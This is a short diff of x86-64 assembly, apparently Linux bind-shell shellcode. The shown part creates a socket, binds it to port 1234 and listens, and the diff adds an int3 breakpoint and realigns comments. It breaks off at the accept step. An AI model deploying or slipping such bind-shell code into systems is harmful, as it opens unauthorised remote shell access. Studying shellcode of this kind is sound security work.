@@ -33,18 +33,19 @@
 
     bits    64
     
+    int3
     ; step 1, create a socket
     ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
     push    41
-    pop     rax     ; rax = sys_socket
+    pop     rax         ; rax = sys_socket
     push    1
-    pop     rsi     ; rsi = SOCK_STREAM
+    pop     rsi         ; rsi = SOCK_STREAM
     push    2
-    pop     rdi     ; rdi = AF_INET
-    cdq             ; rdx = IPPROTO_IP
+    pop     rdi         ; rdi = AF_INET
+    cdq                 ; rdx = IPPROTO_IP
     syscall
     
-    xchg    eax, edi         ; edi=s
+    xchg    eax, edi    ; rdi = s
     
     ; step 2, bind to port 1234 
     ; bind(s, {AF_INET,1234,INADDR_ANY}, 16)
@@ -52,15 +53,15 @@
     not     rax
     push    rax
     push    rsp
-    pop     rsi      ; rsi = &sa 
-    mov     dl, 16   ; rdx = sizeof(sa) 
-    mov     al, 49   ; rax = sys_bind
+    pop     rsi         ; rsi = &sa 
+    mov     dl, 16      ; rdx = sizeof(sa) 
+    mov     al, 49      ; rax = sys_bind
     syscall
     
     ; step 3, listen
     ; listen(s, 0);
-    xor     esi, esi ; rsi = 0
-    mov     al, 50   ; rax = sys_listen
+    xor     esi, esi    ; rsi = 0
+    mov     al, 50      ; rax = sys_listen
     syscall
     
     ; step 4, accept connections
